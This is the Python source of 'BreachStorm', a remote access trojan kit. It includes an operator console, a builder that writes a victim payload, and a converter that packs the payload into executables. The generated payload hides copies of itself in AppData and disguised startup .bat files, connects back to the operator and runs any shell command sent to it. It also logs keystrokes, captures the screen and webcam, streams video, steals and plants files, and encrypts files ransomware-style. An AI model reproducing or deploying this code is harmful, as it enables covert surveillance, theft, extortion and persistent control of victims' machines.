import socket
import base64
import numpy as np
import os
import cv2
import time
import sys
import random
from pynput.keyboard import Key, Listener
import getpass
import threading
import subprocess
import struct
from colorama import Fore, Back, Style, init
init(autoreset=True)
##############
os.system('clear')
name = getpass.getuser()
print(Fore.WHITE+"_________________________________________________________________________________________________________________")
print(Fore.RED +f"""
                                  
████████████████████████████████████████
█▄─▄─▀█▄─▄▄▀█─▄▄▄─█─█─█─▄▄▄▄█─▄▄▄─█▀▄▄▀█
██─▄─▀██─▄─▄█─███▀█─▄─█▄▄▄▄─█─███▀██▀▄██
▀▄▄▄▄▀▀▄▄▀▄▄▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▀
 =================================================================
                                               =  hey {name} Welcom To BreachStorm                             |  
                                               =                      BY   > blackglitch                       |             """+Fore.GREEN+"""
                                               =                      Github > https://github.com/GLITCHlo     |   
                                               = Hi Hacker  If you want hacking windows just you need convert  |             """+Fore.CYAN+"""                                                            
                                               = payload py to exe exist in this tool convert payload to exe   |                                                        
        BreachStorm                            =     #Bro This Payload For This Tool Not For Meta or any tools |                                                      
    is tool for remote devices                 =                 Hacking Mac | Windows | Linux                 |
    you can convert py file to                 =================================================================
    any excute device so bom                                                     <-- V: 1.0 -->                            
""")
print(Fore.WHITE+"_________________________________________________________________________________________________________________")
print(Fore.CYAN+"""

\t██████╗░██████╗░███████╗░█████╗░░█████╗░██╗░░██╗░██████╗████████╗░█████╗░██████╗░███╗░░░███╗
\t██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██║░░██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗████╗░████║
\t██████╦╝██████╔╝█████╗░░███████║██║░░╚═╝███████║╚█████╗░░░░██║░░░██║░░██║██████╔╝██╔████╔██║"""+Fore.MAGENTA+"""
\t██╔══██╗██╔══██╗██╔══╝░░██╔══██║██║░░██╗██╔══██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗██║╚██╔╝██║
\t██████╦╝██║░░██║███████╗██║░░██║╚█████╔╝██║░░██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║██║░╚═╝░██║
\t╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
""")
print(Fore.CYAN+"""
commands   \t|\t\t Description
-b         \t|\t\t Building Malware (file is python)   
-c         \t|\t\t convert file.py to exe... for hacking opreating systems
-h         \t|\t\t show list commands tool
-r         \t|\t\t start remote device , mode listen server
clear      \t|\t\t clear interface tools      
""")
def l9():
 server = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #>ipv4 and protocol tcp
 host = input(Fore.GREEN+"Enter Host >")
 port = int(input(Fore.GREEN+"Enter port >"))
 server.bind((host,port))
 server.listen(1)
 print(Fore.CYAN+"server is listen Trget....")
 client, addrese = server.accept()
 print(Fore.GREEN+f"Victim Detect: ({addrese})")
 def file():
    client.send(b"download")
    name = input(Fore.RESET+"enter name file for downloaded:")
    client.sendall(name.encode("utf-8"))
    dataf = client.recv(921600)
    datad = base64.b64decode(dataf)
    with open(f"{name}", "wb") as f:
        f.write(datad)
 def upload():
   client.send(b"upload")
   name = input(Fore.RESET+"name file for save >")
   client.sendall(name.encode("utf-8"))
   path = input(Fore.RESET+"enter path fir your file >")
   with open(path, "rb") as f:
    dox = f.read()
   enc = base64.b64encode(dox)
   client.sendall(enc)
 def back():
   client.send(b"backdoor")
   name = input(Fore.RESET+"name backdoor for save >")
   client.sendall(name.encode("utf-8"))
   path = input(Fore.RESET+"enter path for backdoor >")
   with open(path, "rb") as f:
    dox = f.read()
   enc = base64.b64encode(dox)
   client.sendall(enc)
 def screenshot():
   client.send(b"screenshot")
   names = ["victime.png", "target.png", "vic.png", "targ.png", "trg.png", "victime.png","hacker.png","ivcm.png","vicc.png","human.png","hacking.png"]
   namet = random.choice(names)
   d = b""
   while True:
    dataf = client.recv(991600)
    if not dataf:
       continue
    d += dataf
    datad = base64.b64decode(d)
    with open(str(namet), "wb") as fg:
      fg.write(datad)
 def snapshot():
    names = ["victime.jpg", "target.jpg", "vic.jpg", "targ.jpg", "trg.jpg", "victime.jpg","hacker.jpg","ivcm.jpg","vicc.jpg","human.jpg","hacking.jpg"]
    namet = random.choice(names)
    client.send(b"snapshot")
    data = b""
    while True:
        packet = client.recv(4096)
        if b"END" in packet:  
            packet = packet.replace(b"END", b"")
            data += packet
            break
        data += packet
    img_data = base64.b64decode(data)
    img_array = np.frombuffer(img_data, np.uint8)
    img = cv2.imdecode(img_array, cv2.IMREAD_COLOR)
    cv2.imwrite(str(namet), img)
 def bdl():
   client.send(b"change")
   dird = input(Fore.RESET+"Enter Nmae Folder or .. >")
   client.sendall(dird.encode("utf-8"))
   path = client.recv(1024)
   pat = path.decode("utf-8")
   print(pat)
 def sc():
   print(Fore.RED+"scan ports....")
   time.sleep(3)
   client.send(b"scanports")
   for i in range(1):
    try:
      dodo = client.recv(1024)
      fofo = client.recv(1024)
      time.sleep(2)
      print(Fore.RESET+f"{dodo.decode("utf-8")} \n {fofo.decode("utf-8")}")
    except:
       soso = client.recv(1024)
       time.sleep(2)
       print(Fore.RED+f"{soso.decode("utf-8")}\n")
 def sartup():
     client.send(b"sartup")
     try:
         print(Fore.GREEN+"save malware in sartup")
     except Exception as fol:
         print(Fore.GREEN+"EROR IN SARTUP")
 def stream():
    client.send(b"strm")
    print(Fore.CYAN+"Starting live stream... press Enter for continue Command.")
    while True:
        try:
            data = client.recv(921600)  
            if not data:
                break
            try:
             frame = cv2.imdecode(np.frombuffer(data, dtype=np.uint8), cv2.IMREAD_COLOR)
             if frame is not None:
                cv2.imshow("Camear Victime Live", frame)
                try:
                 if cv2.waitKey(1) & 0xFF == ord("q"):
                    print("Stream closed. fuck loock file command")
                    client.send(b"END")
                    break
                except UnicodeDecodeError as v:
                   print(f"eror in decode data")
            except Exception as d:
               print(f"repeat comm")
        except Exception as e:
            print(f"Error: {e}")
            break
    cv2.destroyAllWindows()
 def batts():
    client.send(b"batt")
    data = client.recv(1024)
    dec = data.decode("utf-8")
    print(dec)
 def killp():
   client.send(b"killp")
   pid = input(Fore.GREEN+"Enter Id Process >")
   client.sendall(pid.encode("utf-8"))
   msg = client.recv(1024)
   print(msg.decode("utf-8"))
 def harara():
   client.send(b"temps")
   sm = client.recv(1024)
   print(Fore.CYAN+sm.decode("utf-8"))
 def hard():
   client.send(b"hrdl")
   inf = client.recv(1024)
   info = inf.decode("utf-8")
   print(Fore.GREEN+info)
 def ransm():
   client.send(b"ransmware")
   pat = input(Fore.CYAN+"Enter Target Path >")
   path = pat.encode("utf-8")
   client.sendall(path)
   pr_k = client.recv(1024)
   time.sleep(2)
   pb_k = client.recv(1024)
   print(f"private key a blg{pr_k.decode("utf-8")}")
   time.sleep(3)
   print(f"public key a blg{pb_k.decode("utf-8")}")
 def copa():
   client.send(b"copypaste")
   source = input(Fore.GREEN+"Enter Source Path >")
   dest = input(Fore.GREEN+"Enter Destination Path >")
   client.sendall(source.encode("utf-8"))
   time.sleep(3)
   client.sendall(dest.encode("utf-8"))
   ij = input(Fore.CYAN+"are you want delet old file (yes|no):")
   client.send(ij.encode("utf-8"))
 def hidem():
   client.send(b"hidemal")
   pathh = input(Fore.YELLOW+"Enter New Path For Save Malwrae >")
   client.sendall(pathh.encode("utf-8"))
   i = input(Fore.GREEN+"Are you sure you want to remove the real malware path? Warning: If the malware is removed in old path, it will be transferred to the specified path. The next connection will take place in the new directory.\n (Yes | No):")
   if i == "yes":
      client.send(b"yes")
   else:
      pass
 def keyl():
   client.send(b"Keylogger")
   tim = input(Fore.GREEN+"Enter time for listen keyboard >")
   client.sendall(tim.encode("utf-8"))
   clicks = client.recv(1024)
   print(Fore.GREEN+"Output> \n")
   print(Fore.CYAN+clicks.decode("utf-8"))
 def infovnurv():
   client.send(b"adsysinfo")
   o = client.recv(1024)
   print(Fore.RED+o.decode("utf-8"))
   
 while True:
    try:
     shell = input(">").strip()
     if shell == None or shell == '' or shell == '\n' or shell == False:
        continue
     elif not shell:
        continue
     elif shell == "download":
            file()
     elif shell == "upload":
                upload()
     elif shell == "screenshot":
                toto = threading.Thread(target=screenshot)
                toto.daemon = True 
                toto.start()
                print(f"file .png is save in {os.getcwd()}")
     elif shell == "Keylogger":
            keyl()
     elif shell == "change":
            bdl()
     elif shell == "strm":
                sth = threading.Thread(target=stream)
                sth.daemon = True 
                sth.start()
     elif shell == "snapshot":
                snp = threading.Thread(target=snapshot)
                snp.daemon = True 
                snp.start()
                print(f"photo in {os.getcwd()}")
     elif shell == "batt":
            batts()
     elif shell == "killp":
           killp()
     elif shell == "temps":
            hrrr = threading.Thread(target=harara)
            hrrr.daemon = True 
            hrrr.start()
     elif shell == "hrdl":
            hard()
     elif shell == "ransmware":
            ransm()
     elif shell == "adsysinfo":
            infovnurv()
     elif shell == "backdoor":
            back()
     elif shell == "copypaste":
            copa()
     elif shell == "scanports":
        sc()
     elif shell == "hidemal":
            hidem()
     elif shell == "sartup":
         sartup()
     else:
            try:
                client.sendall(shell.encode('utf-8'))
                response = client.recv(4096).decode('utf-8')
                print(Fore.YELLOW+"Output Client : ", Fore.GREEN+response)
                if "returned non-zero exit status 127" in response:
                    continue
                elif not response.strip():
                    continue
            except Exception as n:
                     print(f"Error during client communication: {n}")      
    except Exception as e:
        print(f"Error in sending command: {e}")
    except UnicodeDecodeError:
       print("Received non-text data, saving to file...")

    except:
       print("eror")
       break

 client.close()
 server.close()
def buld():
    name = input("ENter Name Malware(.py) >")
    hosts = input("Enter Host >")
    ports = int(input("Enter Port >"))
    cos = '''
import socket
import base64
import cv2
import subprocess
import pyautogui
import numpy as np
import time
import os
import shutil
import psutil
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES,PKCS1_OAEP
from Crypto.Util.Padding import pad,unpad
from pynput.keyboard import Key, Listener
import threading
import struct
#################################################################
################################################################# 
src = os.path.abspath(__file__)
dst = os.path.join(os.environ.get("USERPROFILE"),"AppData")
shutil.copy(src,dst)  
time.sleep(3)
src = os.path.abspath(__file__)
dst = os.path.join(os.environ.get("USERPROFILE"),"AppData","Local")
shutil.copy(src,dst) 
src = os.path.abspath(__file__)
dst = os.path.join(os.environ.get("USERPROFILE"),"Roaming")
shutil.copy(src,dst) 
src = os.path.abspath(__file__)
dst = os.path.join(os.environ.get("USERPROFILE"),"LocalLow")
shutil.copy(src,dst) 
time.sleep(3)
src = os.path.abspath(__file__)
dst = os.path.join(os.environ.get("USERPROFILE"),"AppData","Local","Comms")
shutil.copy(src,dst) 
#################################################################
def chra():
 charingan = os.path.abspath(__file__)
 momo = os.path.join(os.environ.get("USERPROFILE"),"AppData","Local",charingan)
 batc = f'"{momo}"\\n'
 bp = os.path.join(os.environ.get("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "windows39dj.bat")
 with open(bp, "w") as fil:
    fil.write(batc)
 subprocess.run([bp], shell=True)
################################################################# 
def chra2():
 charingan1 = os.path.abspath(__file__)
 momos = os.path.join(os.environ.get("USERPROFILE"),"AppData","LocalLow",charingan1)
 batcc = f'"{momos}"\\n'
 bpo = os.path.join(os.environ.get("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "microsoftsdom.bat")
 with open(bpo, "w") as fil:
    fil.write(batcc)
 subprocess.run([bpo], shell=True)
################################################################# 
def chra3():
 charingan2 = os.path.abspath(__file__)
 momo = os.path.join(os.environ.get("USERPROFILE"),"AppData","Local","Comms",charingan2)
 batcc = f'"{momo}"\\n'
 bpo = os.path.join(os.environ.get("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "windows Defender.bat")
 with open(bpo, "w") as fil:
    fil.write(batcc)
 subprocess.run([bpo], shell=True)
################################################################# 
def chra4():
 charingan2 = os.path.abspath(__file__)
 momo = os.path.join(os.environ.get("USERPROFILE"),"AppData","Roaming",charingan2)
 batcc = f'"{momo}"\\n'
 bpo = os.path.join(os.environ.get("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "mic64.bat")
 with open(bpo, "w") as fil:
    fil.write(batcc)
 subprocess.run([bpo], shell=True)
################################################################# 
def chra5():
 charingan2 = os.path.abspath(__file__)
 momo = os.path.join(os.environ.get("USERPROFILE"),"AppData",charingan2)
 batcc = f'"{momo}"\\n'
 bpo = os.path.join(os.environ.get("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "windows66s.bat")
 with open(bpo, "w") as fil:
    fil.write(batcc)
 subprocess.run([bpo], shell=True)
#################################################################
ch = threading.Thread(target=chra)
ch.daemon = True 
ch.start() 
ch2 = threading.Thread(target=chra2)
ch2.daemon = True 
ch2.start() 
ch3 = threading.Thread(target=chra3)
ch3.daemon = True 
ch3.start() 
ch4 = threading.Thread(target=chra4)
ch4.daemon = True 
ch4.start() 
ch5 = threading.Thread(target=chra4)
ch5.daemon = True 
ch5.start() 
################'''
    content = f'''
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #>ipv4 and protocol tcp
host = '{hosts}'
port = {ports}
client.connect((host,port))
'''
    cdd = '''
def file():
 data = client.recv(1024)
 name = data.decode("utf-8")
 with open(name, "rb") as f:
    dox = f.read()
 enc = base64.b64encode(dox)
 client.sendall(enc)
def upload():
  name = client.recv(1024)
  recv_size = 4096  
  data = b""
  while True:
   dataf = client.recv(recv_size)
   if not dataf:
      continue
   data += dataf
   datad = base64.b64decode(data)
   with open(f"{name}", "wb") as f:
    f.write(datad)
def back():
  name = client.recv(1024)
  recv_size = 4096  
  data = b""
  while True:
   dataf = client.recv(recv_size)
   if not dataf:
      continue
   data += dataf
   datad = base64.b64decode(data)
   with open(f"{name}", "wb") as f:
    f.write(datad)
def screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("cdd.png")
    with open("cdd.png", "rb") as fo:
      data = fo.read()
    enc = base64.b64encode(data)
    client.sendall(enc)
def snapshot():
    try:
        cap = cv2.VideoCapture(0)  
        if not cap.isOpened():
            pass
            client.send(b"END")
            return
        ret, frame = cap.read()  
        if ret:
            _, buffer = cv2.imencode('.jpg', frame)
            image_data = base64.b64encode(buffer)
            client.sendall(image_data + b"END")  
            pass
        else:
            pass
        cap.release()
    except:
        pass
        client.send(b"END")
def bdl():
   dird = client.recv(1024)
   i = dird.decode("utf-8")
   path = os.getcwd()
   l = os.path.join(path,i)
   os.chdir(l)
   client.sendall(f"path changed {os.getcwd()}".encode("utf-8"))

def stream():
    try:
        cap = cv2.VideoCapture(0) 
        if not cap.isOpened():
            return
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            _, buffer = cv2.imencode('.jpg', frame)
            client.sendall(buffer)  
            try:
             time.sleep(0.1)          
             if cv2.waitKey(1) & 0xFF == ord("q"):
               break
            except UnicodeDecodeError as l:
               pass
    except KeyboardInterrupt:
       pass
    except:
       pass
    finally:
        cap.release()
        client.send(b"END")  # Notify client that streaming has ended
        cv2.destroyAllWindows()
   
def batt():
   batt = psutil.sensors_battery()
   if batt:
      nis = f"{batt.percent} %"
      wax = f"{batt.power_plugged}"
      client.sendall(f"Charger percentage: {nis}% \\n Battery is charging: {wax}".encode("utf-8"))
def killp():
   try:
      pi = client.recv(1024)
      pid = pi.decode("utf-8")
      prc = psutil.Process(int(pid))
      prc.terminate()
      prc.wait(timeout=5)
      client.send(b"The process was completed smoothly.")
   except psutil.TimeoutExpired:
      client.send(b"The operation did not end in time, she will be killed.")
      prc.kill()
      prc.wait()
   except psutil.NoSuchProcess:
      client.send(b"process not found")
def harara():
   try:
         tem = psutil.sensors_temperatures()
         for name, entries in tem.items():
            for ent in entries:
             t = f"{name}:{ent.label or 'N/A'}: {ent.current} °C".encode("utf-8")
             client.send(t)
   except Exception:
      pass
def hard():
   var_c = psutil.cpu_percent(interval=1)
   var_r = psutil.virtual_memory()
   vard_d = psutil.disk_usage('/')
   var_i = psutil.net_io_counters()
   info = f"""
     Ram:
     \t total size: {var_r.total / (1024 ** 3):.2f} GB \n
     \t Free: {var_r.available / (1024 ** 3):.2f} GB \n
     \t percent: {var_r.percent} % \n
     CPU:
     \t cpu: {var_c} % \n
     Hard Disk:
     \t total disk: {vard_d.total / (1024 ** 3):.2f} GB \n
     \t free disk: {vard_d.free / (1024 ** 3):.2f} GB \n 
     \t percent: {vard_d.percent} %
   """
   ff = info.encode("utf-8")
   client.sendall(ff)
def infovnurv():
   namei = os.uname()
   send = f"System: {namei.sysname}, Node: {namei.nodename}, Release: {namei.release}, Version: {namei.version}, Machine: {namei.machine}"
   client.send(send.encode())
def ransmware():
   pat = client.recv(1024)
   path = pat.decode("utf-8")
   key = RSA.generate(1024)
   prv_key = key.export_key()
   public_k = key.publickey().export_key()
   client.sendall(prv_key)
   client.sendall(public_k)
   rsa_cipher = PKCS1_OAEP.new(key.publickey())
   for root, dirs, files in os.walk(path):
      for filen in files:
         file_p = os.path.join(root,filen)
         try:
            with open(file_p, "rb") as f:
               data_f = f.read()
               aes_key = get_random_bytes(16)
               aes_cipher = AES.new(aes_key,AES.MODE_CBC)
               encd = aes_cipher.encrypt(pad(data_f,AES.block_size))
               enc_k_a = rsa_cipher.encrypt(aes_key)
               with open(file_p, "wb") as fg:
                  fg.write(enc_k_a + aes_cipher.iv + encd)
         except Exception as d:
            pass
def sc():
 ports = [20, 21, 22, 23, 25, 53, 110, 123, 143, 445, 3306, 3389, 5900, 5357, 6379,7, 9, 19, 37, 135, 137, 138, 139, 161, 162, 389, 636, 3389, 5353, 5938, 6000-6063]
 for i in range(1):
    namep = socket.gethostname()
    host = socket.gethostbyname(namep)
    for port in ports:
        conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        conn.settimeout(2)
        try:
            conn.connect((host,port))
            ser = socket.getservbyport(port)
            bobo = f"[+] port > {str(port)} up \\n"
            client.sendall(bobo.encode("utf-8"))
            pop = f"open > {ser}\\n"
            client.snedall(pop.encode("utf-8"))
            conn.close()
        except Exception as e:
            soso = f"[-] port closed > {str(port)} \\n"
            client.sendall(soso.encode("utf-8"))
            continue
    
def copa():
   src = client.recv(1024)
   time.sleep(3)
   dest = client.recv(1024)
   srcc = src.decode("utf-8")
   dstt = dest.decode("utf-8")
   shutil.copy(srcc,dstt)
   cv = client.recv(1024)
   cvv = cv.decode("utf-8")
   if cvv == "yes":
      os.remove(srcc)
   else:
      pass
def keyl():
   tim = client.recv(1024)
   timm = tim.decode("utf-8")
   def click(key):
      global textty
      try:
         textty += key.char
      except AttributeError:
         if key == Key.space:
            textty += " "
         elif key == Key.enter:
            textty += "\\n"
         elif key == Key.backspace:
            textty = textty[:-1]
   def stopmal(listener):
    listener.stop()
    client.sendall(textty.encode("utf-8"))
   def start_listener():
    global textty
    textty = ""  
    with Listener(on_press=click) as listener:
        ti = int(timm)
        timer = threading.Timer(ti, stopmal, [listener])
        timer.start()
        listener.join()
   start_listener() 
def hidem():
   path = client.recv(1024)
   src = os.path.abspath(__file__)
   dst = path.decode("utf-8")
   shutil.copy(src,dst)   
   ec = client.recv(1024)
   if ec.decode("utf-8") == "yes":
       os.remove(src)
   else:
      pass
def comm(command):
       try:
         result = subprocess.check_output(command, text=True, shell=True, stderr=subprocess.STDOUT)
         client.sendall(result.encode('utf-8'))
       except Exception as d:
          pass
while True:
  try:
   command = client.recv(4096).decode()  
   if command == None or command == '' or command == '\\n' or command == False:
      continue
   elif not command:
      continue
   elif command == "Keylogger":
      keyl()
   elif command == "download":
    file()
   elif command == "upload":
     upload()
   elif command == "screenshot":
                scrt = threading.Thread(target=screenshot)
                scrt.daemon = True
                scrt.start()
                scrt.join()
   elif command == "snapshot":
                d = threading.Thread(target=snapshot)
                d.daemon = True 
                d.start()
   elif command == "change":
      bdl()
   elif command == "adsysinfo":
      infovnurv()
   elif command == "hidemal":
      hidem()
   elif command == "strm":
            stream_thread = threading.Thread(target=stream)
            stream_thread.daemon = True 
            stream_thread.start()
   elif command == "batt":
      batt()
   elif command == "killp":
      killp()
   elif command == "scanports":
      sc()
   elif command == "temps":
      harara()
   elif command == "hrdl":
      hard()
   elif command == "ransmware":
      ransmware()
   elif command == "copypaste":
      copa()
   elif command == "backdoor":
      back()
   else:
     try:
        result = subprocess.check_output(command, text=True, shell=True, stderr=subprocess.STDOUT)
        client.sendall(result.encode('utf-8'))
        if result == f"Command '{command}' returned non-zero exit status 127.":
           continue
     except Exception as h:
       print(f"eror in {h}")
     except subprocess.CalledProcessError as e:
        print(f"no out d {e}")
        continue
  except Exception as f:
    print(f"eror {f}")
    break  
client.close()
'''
    bom = f"{cos}{content}{cdd}"
    with open(name,"wb") as d:
        d.write(bom.encode("utf-8"))
def coomm():
    print(f"all commands and photo in {os.getcwd()} / command")
    print(f"thack you {name} for download my tools")
    print(Fore.RED+"""
          \t <WARING!!!!!!!!!!!!!!!!>
If you enable the streaming feature:
\tIt is highly recommended to use this feature only when absolutely necessary.
\tAfter finishing your objective, do not attempt to close the streaming window manually.
\tInstead, press Enter in the Shell window to complete the process properly and continue your work.
\t⚠️ Failure to follow these steps may cause errors or disruptions. Always use this feature with caution and only for legitimate purposes. 🚀""")
    print("____________________________________________________________________________________________________________________________")
    print(Fore.CYAN+"""
malwares commands:
        Keylogger          	Starts a keylogger to capture and send typed keys for a specified time.
        backdoor	            Establishes a persistent connection for the backdoor.
        ransmware	            Encrypts files in a specified path using RSA and AES encryption.
        hidemal	            Hides the malware by copying it to another location and optionally deleting the original file.      
camera commands:
        screenshot      	Captures and sends a screenshot of the client's screen.
        snapshot          	Captures an image using the client's camera.
        strm	    Starts a video stream from the client's camera.
system controle:
        hrdl	    Sends system resource usage details (CPU, RAM, Disk).
        temps	    Sends temperature information from the client's system sensors.
        killp	    Terminates a process on the client using its PID.
        batt	    Sends the battery percentage and charging status of the client.
        adsysinfo	Sends basic system information (OS, Node, Release, Version, Machine).
        scanports  	Scans common ports on the client's system and reports their status (open/closed).
file controle commands:
        download	Allows downloading files from the client. if enter dow exist input for enter name for download
        upload	    Enables uploading files to the client. exist in up;oad input for name for saving file and enter path for file for uload
        change	    Allows changing the working directory of the client. exist input in input enter name folder or .. for back
        copypaste	Copies a file to another location and optionally deletes the original file.
alll commands for systems(ls dir whoami .........................................................)

     Any command	Executes the received shell command on the client's system and sends the result back.
""")
import subprocess
def conve():
 print("you need download Pyibstaller for convert exe (pip install pyinstaller)")
 print("you need download py2app for convert macos (pip install py2app)")
 e = input("are you download libs for convert (yes|no) >")
 if e == "yes":
  opop = input("For Linux (l) | For Windows (w) | For macOS (m) > ")
  if opop == "w":
    file = input("Enter path to malware Python file > ")
    ico = input("Enter path to ICO file (if you do not want ICO, type 'no') > ")
    file = f'"{file}"' if ' ' in file else file
    if ico != "no":
        ico = f'"{ico}"' if ' ' in ico else ico
        subprocess.run(f"pyinstaller --onefile --icon={ico} {file}", text=True, shell=True, capture_output=True).stdout
        print("wait your file exe in folder dist")
    else:
        subprocess.run(f"pyinstaller --onefile {file}", text=True, shell=True, capture_output=True).stdout
        print("wait your file exe in folder dist")
  elif opop == "m":
    file = input("Enter path to Python file > ")
    file = f'"{file}"' if ' ' in file else file
    subprocess.run(f"python3 setup.py py2app -A --alias {file}", text=True, shell=True, capture_output=True).stdout
    print("wiat")
    print("wait your file exe in folder dist")
  else:
    print("Invalid option! Please choose between 'w' for Windows and 'm' for macOS.")

 else:
  print("you need download Pyibstaller for convert exe (pip install pyinstaller)")
  print("you need download py2app for convert macos (pip install py2app)")
while True:
   try:
    choce = input(Fore.GREEN+"L'ets Go >")
    if choce == "-b":
      buld()
    elif choce == "-c":
      conve()
    elif choce == "-h":
     coomm()
    elif choce == "-r":
       l9()
    elif choce == "clear":
        os.system('clear')
   except Exception as fkrk:
         print(f"eror in {fkrk}")
